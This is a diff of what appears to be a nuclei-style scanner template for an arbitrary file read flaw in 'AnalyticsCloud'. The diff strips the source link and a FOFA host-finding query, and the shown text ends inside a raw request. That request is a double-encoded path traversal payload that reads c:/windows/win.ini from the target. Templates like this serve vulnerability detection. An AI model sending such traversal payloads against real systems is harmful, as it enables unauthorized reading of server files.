@@ -3,12 +3,8 @@ info:
   name: AnalyticsCloud 分析云 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hhwzg6vu13fg170e'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hhwzg6vu13fg170e
-    fofa: icon_hash="888607769"
 http:
 - raw:
   - 'GET /.%252e/.%252e/c:/windows/win.ini HTTP/1.1
